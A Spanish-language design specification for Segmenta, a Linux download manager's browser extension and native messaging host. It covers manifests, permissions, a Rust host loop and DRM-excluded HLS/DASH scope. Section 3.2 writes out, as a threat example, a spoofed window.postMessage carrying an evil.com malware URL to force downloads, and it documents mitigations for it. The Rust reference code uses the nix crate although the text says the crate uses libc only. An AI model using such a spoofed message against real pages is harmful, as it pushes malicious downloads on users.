# OpenSpec 09: Extensión WebExtension, Seguridad de Native Messaging y Alcance Streaming

> **Especificación:** OPENSPEC-SEGMENTA-009
> **Versión:** 2.0.0 (0.2.0 **en preparación**)
> **Área:** Integración con Navegadores, Seguridad Web, Host Nativo y Límites Legales de Streaming
>
> Todo lo marcado como «(0.2, en preparación)» describe el contrato acordado para 0.2.0; no es
> comportamiento entregado hasta que Q1 cierre con el QA real. Lo que no lleva esa marca ya está
> implementado en el repositorio.

---

## 1. Separación de Manifiestos de Native Messaging

Chrome y Firefox utilizan sintaxis incompatibles para autorizar extensiones en el protocolo de Native Messaging.
El `.deb` instala los manifiestos de sistema; `extension/install-native.sh` escribe las variantes de
usuario para navegadores instalados por el usuario.

### 1.1. Manifiesto para Chromium, Google Chrome, Brave, Vivaldi, Opera y Microsoft Edge

* **Rutas de sistema (las instala el `.deb`):**
  `etc/opt/chrome/native-messaging-hosts/io.github.wilkin.segmenta.json`,
  `etc/chromium/native-messaging-hosts/...`,
  `etc/opt/edge/native-messaging-hosts/...`,
  `etc/brave/native-messaging-hosts/...`,
  `etc/vivaldi/native-messaging-hosts/...` y `etc/opera/native-messaging-hosts/...`
* **Ruta de usuario:**
  `~/.config/google-chrome/NativeMessagingHosts/io.github.wilkin.segmenta.json`
  (para Brave: `~/.config/BraveSoftware/Brave-Browser/NativeMessagingHosts/...`)
* **Contenido:**
```json
{
  "name": "io.github.wilkin.segmenta",
  "description": "Host de mensajería nativa para Segmenta en Ubuntu",
  "path": "/usr/bin/segmenta-host",
  "type": "stdio",
  "allowed_origins": [
    "chrome-extension://kdeldnifdbpemnhfpmhonlnibbhnoaan/"
  ]
}
```

### 1.2. Manifiesto para Mozilla Firefox

* **Ruta de sistema:** `/usr/lib/mozilla/native-messaging-hosts/io.github.wilkin.segmenta.json`
* **Ruta de usuario:** `~/.mozilla/native-messaging-hosts/io.github.wilkin.segmenta.json`
* **Contenido:**
```json
{
  "name": "io.github.wilkin.segmenta",
  "description": "Host de mensajería nativa para Segmenta en Ubuntu",
  "path": "/usr/bin/segmenta-host",
  "type": "stdio",
  "allowed_extensions": [
    "segmenta@wilkin.github.io"
  ]
}
```

El nombre del archivo en `/usr/lib/mozilla/native-messaging-hosts/` es el nombre del host
(`io.github.wilkin.segmenta.json`), no el ID de Gecko. `packaging/check-package.sh` valida exactamente
esa ruta dentro del `.deb`.

---

## 2. Clave Fija de Desarrollador e Identificador Determinista

La clave de la extensión no es un secreto de seguridad del usuario: es pública y sólo fija el ID. La
clave privada de firma sí es un secreto y nunca se commitea.

* En Chromium, `extension/chromium/manifest.json` incluye una clave pública RSA fija (`"key"`) que
  deriva siempre el mismo ID:

  | Dato | Valor real |
  | --- | --- |
  | ID de la extensión Chromium | `kdeldnifdbpemnhfpmhonlnibbhnoaan` |
  | Fuente de verdad | `extension/CHROMIUM-ID.txt` |
  | Consumidor del ID | `crates/segmenta-daemon/src/browsers.rs` (`CHROMIUM_EXTENSION_ID`) |

* En Firefox, el ID se define en `extension/firefox/manifest.json`:
  ```json
  "browser_specific_settings": {
    "gecko": {
      "id": "segmenta@wilkin.github.io",
      "strict_min_version": "128.0"
    }
  }
  ```
  `crates/segmenta-daemon/src/browsers.rs` expone `FIREFOX_EXTENSION_ID` con el mismo valor y el
  manifiesto nativo usa `allowed_extensions`.
* Si la `key` y el ID documentado dejan de corresponder, Chrome asigna otro ID y el host nativo deja
  de autorizar la extensión. Un cambio de `key` obliga a actualizar `CHROMIUM-ID.txt`, `browsers.rs`,
  los manifiestos nativos y este documento en el mismo commit.
* En 0.2 no hay tienda: el ID se mantiene porque la extensión se carga manualmente desde el ZIP del
  `.deb` (o desde una copia del árbol `extension/`) y el manifest sigue siendo la única fuente del
  mismo.

---

## 3. Inyección en `world: "MAIN"` y Seguridad contra Inyección Web

### 3.1. Inyección de Contexto en Manifest V3

A partir de Chromium 111+ (`minimum_chrome_version: "111"`), Manifest V3 permite declarar scripts
directamente en el contexto principal de la página (`world: "MAIN"`), sin insertar etiquetas
`<script>` en el DOM. La forma real de los dos manifiestos es YouTube-only, sin `all_frames`:

```json
"content_scripts": [
  {
    "matches": ["https://www.youtube.com/*"],
    "js": ["document.js"],
    "run_at": "document_start",
    "world": "MAIN"
  },
  {
    "matches": ["https://www.youtube.com/*"],
    "js": ["shared/browser-api.js", "shared/protocol.js", "shared/panel.js", "content.js"],
    "run_at": "document_start",
    "world": "ISOLATED"
  }
]
```

`document.js` es el único script que corre en el mundo de la página; el panel, el protocolo y el
handshake viven en el mundo aislado.

### 3.2. Prevención de Falsificación de Eventos (`MessageChannel`)

* **Vulnerabilidad Potencial:** un sitio web podría emitir
  `window.postMessage({source: "segmenta-sniffer", url: "https://evil.com/malware.iso"})` para forzar
  descargas arbitrarias.
* **Solución de Seguridad Obligatoria:**
  1. Durante la carga de la página, `content.js` (entorno aislado) crea una instancia privada de
     **`MessageChannel`**:
     ```javascript
     const channel = new MessageChannel();
     window.postMessage({ type: "SEGMENTA_HANDSHAKE" }, "*", [channel.port2]);
     channel.port1.onmessage = (event) => {
         // Procesar evento verificado desde el puerto privado
         handleMediaDetected(event.data);
     };
     ```
  2. `document.js` recibe el puerto en el evento inicial y envía todos los eventos exclusivamente a
     través de ese `MessagePort`, comprobando `event.source === window`.
  3. El `MessagePort` reduce el ruido entre extensiones y páginas, pero **no sustituye la
     autorización**: cualquier script de la página puede observar el `postMessage` inicial y competir
     por el puerto. Por eso `content.js` no ejecuta una descarga por el solo hecho de recibir un
     mensaje: exige un gesto explícito del usuario, valida que la URL sea `http(s)` y que el esquema no
     sea `file:`/`javascript:`, y el daemon vuelve a validar URL, SSRF y destino. Un `postMessage`
     con `"*"` no es una frontera de seguridad.

---

## 4. Host Nativo (`segmenta-host`)

El host nativo en Rust (`crates/segmenta-host`) procesa mensajes continuamente por `stdin`
respetando **little-endian**, con límite de 1 MiB por mensaje, y los reenvía al socket Unix del
daemon. Sin shell, sin rutas del navegador, con allowlist de métodos y mensajes de error sin datos
sensibles. El crate depende sólo de `libc`, `serde` y `serde_json`, y resuelve el UID con `libc`, no
con `nix`. Esquema de referencia del bucle:

```rust
use std::error::Error;
use std::io::{self, Read, Write};
use std::os::unix::net::UnixStream;

const MAX_MESSAGE_SIZE: usize = 1024 * 1024; // 1 MiB

fn main() -> Result<(), Box<dyn Error>> {
    let mut stdin = io::stdin().lock();
    let mut stdout = io::stdout().lock();

    // Conectar al socket Unix del daemon de Segmenta
    let socket_path = std::env::var("XDG_RUNTIME_DIR")
        .map(|p| format!("{}/segmenta/daemon.sock", p))
        .unwrap_or_else(|_| format!("/run/user/{}/segmenta/daemon.sock", nix::unistd::getuid()));

    let mut stream = UnixStream::connect(&socket_path)?;

    // Bucle continuo de Native Messaging
    let mut length_buf = [0u8; 4];
    while stdin.read_exact(&mut length_buf).is_ok() {
        // Little-Endian obligatorio según la especificación de Chromium
        let length = u32::from_le_bytes(length_buf) as usize;

        if length == 0 || length > MAX_MESSAGE_SIZE {
            eprintln!("Error: Longitud de mensaje inválida: {}", length);
            break;
        }

        let mut payload = vec![0u8; length];
        stdin.read_exact(&mut payload)?;

        // Reenviar al daemon con delimitador de salto de línea
        payload.push(b'\n');
        stream.write_all(&payload)?;

        // Leer respuesta del daemon (NDJSON)
        let mut response_bytes = Vec::new();
        let mut reader = io::BufReader::new(&stream);
        use io::BufRead;
        reader.read_until(b'\n', &mut response_bytes)?;

        if response_bytes.ends_with(b"\n") {
            response_bytes.pop();
        }

        // Responder al navegador por stdout
        let resp_len = (response_bytes.len() as u32).to_le_bytes();
        stdout.write_all(&resp_len)?;
        stdout.write_all(&response_bytes)?;
        stdout.flush()?;
    }

    Ok(())
}
```

---

## 5. Alcance Técnico y Legal de Streaming (HLS / DASH)

Sin cambios en 0.2: el alcance de streaming es el ya entregado.

### 5.1. Límites Legales y Cumplimiento de Tratados Internacionales
Segmenta establece un límite funcional estricto para evitar violaciones de derechos de autor y de la
sección 1201 de la DMCA (*Anti-Circumvention Rule*):

* **Soportado y Permitido:**
  * Flujos HLS (`.m3u8`) y MPEG-DASH (`.mpd`) públicos **sin cifrar** (`EXT-X-KEY:METHOD=NONE` y sin
    `ContentProtection`).
  * El cifrado AES-128/SAMPLE-AES de HLS y cualquier `ContentProtection` quedan fuera de alcance:
    requieren gestión de claves y no se deben presentar como “cifrado libre”.
* **Estrictamente Fuera de Alcance (*Out of Scope*):**
  * Mecanismos de Gestión de Derechos Digitales (**DRM**): Google Widevine, Apple FairPlay, Microsoft
    PlayReady y ClearKey cerrado.
  * **Comportamiento Ante Streams con DRM:** si el parser detecta `#EXT-X-KEY` con métodos distintos a
    `NONE` o bloques `<ContentProtection>` con esquemas DRM cerrados, el motor **aborta
    inmediatamente la captura** y muestra una notificación:
    *"Este contenido utiliza protección DRM no compatible con Segmenta."*

### 5.2. Pipeline Concurrente de Descarga y Fusión sin Pérdida
Para transmisiones públicas permitidas:
1. El parser extrae la lista de fragmentos `.ts` o `.m4s` de audio y video.
2. Cada fragmento se descarga mediante workers concurrentes.
3. Se genera un archivo de lista para concatenación:
   ```txt
   ffconcat version 1.0
   file 'chunk_001.m4s'
   file 'chunk_002.m4s'
   ```
4. **Segmento de inicialización:** en fMP4 se descarga y se coloca primero el `init` referenciado por
   `EXT-X-MAP`/`SegmentTemplate.initialization`; sin él, concatenar `.m4s` produce un archivo inválido.
5. Se ejecuta FFmpeg en modo de copia directa de flujo sin recodificación (*stream copy*):
   ```bash
   ffmpeg -y -f concat -safe 0 -i video_list.txt -f concat -safe 0 -i audio_list.txt -c copy -movflags +faststart salida.mp4
   ```
6. Esto preserva la calidad original y evita recodificar. Las listas, el init y la ejecución se hacen
   con `tokio::process::Command` y argumentos, nunca con un string pasado a una shell.
7. **Fuera de alcance:** DRM, AES-128/SAMPLE-AES, live con ventanas móviles, subtítulos y pistas
   múltiples. Un manifiesto fuera de alcance se rechaza antes de descargar un solo fragmento.

---

## 6. Permisos reales de la extensión

Los dos manifiestos declaran **exactamente** la misma lista. Esta tabla es la matriz vigente y
sustituye a cualquier lista anterior de este documento:

| Permiso | Uso | Límite |
| --- | --- | --- |
| `nativeMessaging` | Hablar con `segmenta-host` | Sólo el host `io.github.wilkin.segmenta` |
| `storage` | Preferencias de la extensión y del panel | Sin secretos, sin cookies, sin historial |
| `scripting` | Inyectar el sniffer bajo demanda | Sólo en pestañas donde el usuario abrió el panel |
| `activeTab` | Acceso al sitio que el usuario está viendo | Concesión por gesto; no es acceso permanente |
| `downloads` | Detectar la descarga real del navegador y reconciliar el cold-start | Sólo lectura de estado e id; no borra archivos |
| `contextMenus` | “Descargar con Segmenta” | Sólo ítem de menú contextual |
| `notifications` | Avisar de errores y de la captura tomada | Texto sin datos sensibles |
| `alarms` | Watchdog del service worker MV3 | Un único temporizador periódico |

Permisos de host:

| Campo | Valor real | Consecuencia |
| --- | --- | --- |
| `host_permissions` | `https://www.youtube.com/*` | Único sitio con sniffer de medios |
| `optional_host_permissions` | `https://*/*` | Captura genérica de descargas opt-in por sitio, concedida por el usuario |

**`cookies` no se pide y no se pedirá en 0.2.** La extensión nunca lee cookies, `localStorage` ni
cabeceras `Authorization` del sitio: la captura entrega la URL y el daemon construye la request. Las
credenciales de sitio viven en el daemon (Basic + GNOME Keyring, ver 12), no en el navegador.

Un permiso nuevo requiere revisión de seguridad y un OpenSpec, no un cambio silencioso del manifest:
`README`, este documento y los dos manifiestos deben coincidir o el gate de tests de manifiesto falla.

---

## 7. Instalación manual de la extensión

No hay Chrome Web Store ni AMO en 0.2 y no se va a prometer firma ni publicación. El flujo es manual y
la GUI sólo lo asiste:

1. El `.deb` instala los dos ZIP en `/usr/share/segmenta/extensions/`
   (`segmenta-chromium.zip` y `segmenta-firefox.zip`) y los manifiestos nativos de sistema.
2. El RPC `extension.status` (expuesto también por el subcomando CLI `extension`) informa del estado
   honesto: `native-ready`, `native-missing`, `extension-installed` o `unsupported`. Nunca se informa
   «instalada y conectada» cuando sólo existe el manifiesto nativo.
3. `extension.prepare` descomprime el ZIP del navegador elegido en un directorio estable del usuario y
   deja la ruta lista para cargar; `extension.open` abre el navegador en la página de carga
   (`chrome://extensions` con modo desarrollador, o `about:debugging#/runtime/this-firefox`).
4. El usuario carga la carpeta/ZIP y la GUI vuelve a consultar `extension.status` para confirmar.

Límites explícitos:

* **Chrome estable no permite instalar una extensión automáticamente** sin tienda o política de
  empresa; la GUI sólo prepara y abre. Es un límite de plataforma, no un bug.
* **Firefox**: la carga desde `about:debugging` es temporal y se pierde al reiniciar el navegador; en
  0.2 se documenta como tal, sin XPI firmado.
* **Firefox snap** no puede ejecutar el host nativo del sistema: es una limitación conocida y no se
  intenta burlar el sandbox.
* El `.deb` **no** instala la extensión en el perfil del navegador; sólo deja los artefactos y los
  manifiestos nativos.

---

## 8. Límites de sitio: sniffer YouTube-only y captura genérica

* **Sniffer de medios**: sólo YouTube (`https://www.youtube.com/*`). No hay adaptadores para Vimeo,
  Twitter/X, Instagram ni ningún otro sitio, y no se anuncian como soportados. El panel de calidades
  (4K/1080p/720p/360p + audio, 720p por defecto) es YouTube-only.
* **Captura genérica de descargas**: cuando el usuario concede el permiso opcional del sitio, la
  extensión detecta una descarga del navegador y pide confirmación (nombre, host y carpeta con
  aceptar/rechazar/timeout). No inspecciona contenido ni decide por tipo de archivo.
* **Fuera del permiso concedido no hay captura**: sin permiso opcional, una descarga de otro sitio
  sigue siendo del navegador y Segmenta no la intercepta.
* **Cold-start**: al arrancar el worker se reconcilian las descargas en curso con
  `downloads.search`, reutilizando la misma decisión de captura; la carrera con un evento ocurrido
  antes de que exista el worker queda como límite documentado, no como promesa de captura
  garantizada.

---

## 9. Antivirus y post-proceso (0.2, en preparación)

La extensión no escanea nada. El antivirus es una fase del daemon después de que el archivo está
completo (contrato en `12-queue-scheduler-postprocess-auth.md`):

* `antivirus_enabled` está en `false` por defecto y ClamAV es **opcional**; el `.deb` no lo embebe ni
  lo declara obligatorio.
* Con el antivirus activo y sin motor, la tarea termina `failed` con
  `ERR_ANTIVIRUS_UNAVAILABLE`; nunca se publica `completed`.
* Una infección mueve el archivo a cuarentena y deja la tarea `failed` con `ERR_ANTIVIRUS_FOUND`; el
  archivo escaneado no queda en Descargas.
* El hook argv de post-proceso (`postprocess_command`) usa sólo `%file%`, `%folder%` y `%name%`, nunca
  una shell.

---

## 10. Alcance de seguridad en 0.2 (en preparación)

- **Permisos mínimos**: los ocho de §6; `host_permissions` sólo `https://www.youtube.com/*` y captura
  genérica por permiso opcional por sitio, nunca `<all_urls>` en `host_permissions`.
- **ID**: el real es `kdeldnifdbpemnhfpmhonlnibbhnoaan` (`extension/CHROMIUM-ID.txt` y
  `browsers.rs`); Firefox es `segmenta@wilkin.github.io`. `allowed_origins`/`allowed_extensions` deben
  coincidir con ellos.
- **Mensajería**: el `background` valida remitente (mismo ID de extensión), tipo de mensaje, esquema y
  host de la URL y tamaño (< 64 KiB). `document.js` entrega eventos por `MessageChannel` a un puerto
  concreto, comprobando `event.source === window`; nunca `postMessage("*")` como frontera.
- **Sin credenciales**: la extensión no lee cookies ni `localStorage` del sitio, no reenvía
  `Authorization` y no descarga contenido privado o con edad. Los logins de sitio se configuran en el
  daemon (Basic + keyring, sin Digest) y nunca vuelven a la extensión.
- **Sin DRM**: claves HLS (`EXT-X-KEY` ≠ `NONE`) y `ContentProtection` de DASH se rechazan con
  `ERR_DRM_PROTECTED`; no se implementa ningún bypass.
- **Sin código remoto**: no hay `eval`, `new Function`, scripts remotos ni dependencias npm en tiempo
  de ejecución; el ZIP contiene sólo archivos locales.
- **Host**: sin shell, sin rutas del navegador, allowlist de métodos y mensajes de error sin datos
  sensibles.
- **Antivirus**: opcional, externo (ClamAV del sistema) y ejecutado por el daemon con argv, timeout y
  cuarentena; ver §9.
